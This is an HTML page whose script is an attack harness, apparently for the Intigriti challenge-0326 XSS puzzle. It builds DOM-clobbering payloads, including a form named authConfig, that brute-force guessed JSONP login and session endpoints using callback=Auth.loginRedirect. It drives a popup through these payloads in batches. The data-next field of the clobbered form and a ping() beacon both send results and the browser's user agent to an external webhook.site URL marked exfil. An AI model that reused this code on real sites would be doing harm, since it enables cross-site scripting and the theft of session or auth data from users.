<!doctype html>
<meta charset="utf-8">
<title>challenge0326 batch harness</title>
<body>batch-harness</body>
<script>
const RUN = 'seq3';
const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
const TARGET = 'https://challenge-0326.intigriti.io/challenge.html?q=';
const STEP_DELAY_MS = 2000;
const BATCH_SIZE = 60;

function ping(message) {
  const image = new Image();
  image.src = `${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`;
}

function chunk(items, size) {
  const batches = [];
  for (let index = 0; index < items.length; index += size) {
    batches.push(items.slice(index, index + size));
  }
  return batches;
}

function buildPayload(batchId, requestPaths) {
  const parts = [
    `<form name=authConfig data-next="${SINK}?run=${encodeURIComponent(RUN)}&batch=${encodeURIComponent(batchId)}&exfil=1" data-append="true"></form>`
  ];

  for (const requestPath of requestPaths) {
    const config = JSON.stringify({
      path: '/',
      type: requestPath.replace(/^\//, '') + '#'
    });
    parts.push(`<div data-component="true" data-config='${config}'></div>`);
  }

  return parts.join('');
}

function toChallengeUrl(batchId, requestPaths) {
  return TARGET + encodeURIComponent(buildPayload(batchId, requestPaths));
}

function buildCandidates() {
  const set = new Set();

  function add(path) {
    set.add(path);
  }

  function addVariants(basePath, variants) {
    add(basePath);
    for (const variant of variants) {
      const separator = basePath.includes('?') ? '&' : '?';
      add(`${basePath}${separator}${variant}`);
    }
  }

  [
    '/search',
    '/api/search',
    '/internal/search',
    '/api/internal/search',
    '/search/internal',
    '/portal/search',
    '/api/portal/search',
    '/query',
    '/lookup',
    '/results'
  ].forEach(base => {
    addVariants(base, [
      'callback=Auth.loginRedirect&q=test&domain=internal',
      'callback=Auth.loginRedirect&q=*&domain=internal',
      'callback=Auth.loginRedirect&q=%25&domain=internal',
      'callback=Auth.loginRedirect&q=test&scope=internal',
      'callback=Auth.loginRedirect&q=test&source=internal',
      'format=jsonp&callback=Auth.loginRedirect&q=test&domain=internal',
      'cb=Auth.loginRedirect&q=test&domain=internal',
      'callback=Auth.loginRedirect&q=test'
    ]);
  });

  [
    '/auth/callback',
    '/login/callback',
    '/signin/callback',
    '/sso/callback',
    '/oauth/callback',
    '/oauth2/callback',
    '/oidc/callback',
    '/auth/redirect',
    '/login/redirect',
    '/auth/return',
    '/auth/result',
    '/session/redirect',
    '/signin-oidc'
  ].forEach(base => {
    addVariants(base, [
      'callback=Auth.loginRedirect&code=x&state=x',
      'callback=window.Auth.loginRedirect&code=x&state=x',
      'callback=top.Auth.loginRedirect&code=x&state=x',
      'callback=Auth.loginRedirect&error=access_denied',
      'callback=Auth.loginRedirect&token=x',
      'callback=Auth.loginRedirect&next=%2F',
      'callback=Auth.loginRedirect&returnTo=%2F',
      'callback=Auth.loginRedirect&redirect=%2F',
      'callback=Auth.loginRedirect&redirect_uri=%2F',
      'cb=Auth.loginRedirect&code=x&state=x',
      'format=jsonp&callback=Auth.loginRedirect&code=x&state=x',
      'format=jsonp&callback=Auth.loginRedirect&token=x'
    ]);
  });

  [
    '/session',
    '/api/session',
    '/auth/session',
    '/session/me',
    '/me',
    '/api/me',
    '/whoami',
    '/profile',
    '/bootstrap',
    '/init',
    '/context',
    '/config',
    '/auth-callback',
    '/login-redirect',
    '/session-callback',
    '/callback-handler',
    '/auth-handler',
    '/session-handler'
  ].forEach(base => {
    addVariants(base, [
      'callback=Auth.loginRedirect',
      'format=jsonp&callback=Auth.loginRedirect',
      'callback=Auth.loginRedirect&raw=1',
      'callback=Auth.loginRedirect&full=1',
      'callback=Auth.loginRedirect&include=user',
      'callback=Auth.loginRedirect&include=config',
      'cb=Auth.loginRedirect'
    ]);
  });

  [
    '/admin',
    '/admin/session',
    '/admin/config',
    '/admin/bootstrap',
    '/debug',
    '/debug/session',
    '/debug/config',
    '/internal',
    '/internal/session',
    '/internal/config'
  ].forEach(base => {
    addVariants(base, [
      'callback=Auth.loginRedirect',
      'format=jsonp&callback=Auth.loginRedirect',
      'callback=Auth.loginRedirect&debug=1',
      'callback=Auth.loginRedirect&admin=1',
      'callback=Auth.loginRedirect&dump=1',
      'callback=Auth.loginRedirect&verbose=1',
      'cb=Auth.loginRedirect'
    ]);
  });

  return Array.from(set);
}

function navigatePopupBatches() {
  const candidates = buildCandidates();
  const batches = chunk(candidates, BATCH_SIZE).map((paths, index) => ({
    id: `b${String(index + 1).padStart(2, '0')}`,
    paths
  }));

  ping(`main:boot:${navigator.userAgent}`);
  ping(`main:candidate-count:${String(candidates.length)}`);
  ping(`main:batch-count:${String(batches.length)}`);

  let popup = null;
  try {
    popup = window.open('about:blank', 'intigriti-batch-probe');
    ping(`main:popup-open:${String(!!popup)}`);
  } catch (error) {
    ping(`main:popup-open-error:${error.name}:${error.message}`);
    return;
  }

  batches.forEach((batch, index) => {
    const url = toChallengeUrl(batch.id, batch.paths);
    setTimeout(() => {
      ping(`nav:${batch.id}:len:${String(url.length)}:count:${String(batch.paths.length)}`);
      try {
        if (popup) {
          popup.location = url;
        }
      } catch (error) {
        ping(`nav-error:${batch.id}:${error.name}:${error.message}`);
      }
    }, index * STEP_DELAY_MS);
  });

  setTimeout(() => {
    try {
      ping(`main:popup-closed-final:${popup ? String(popup.closed) : 'null'}`);
    } catch (error) {
      ping(`main:popup-closed-final-error:${error.name}:${error.message}`);
    }
    document.body.textContent = `done:${RUN}`;
  }, batches.length * STEP_DELAY_MS + 2000);
}

navigatePopupBatches();
</script>
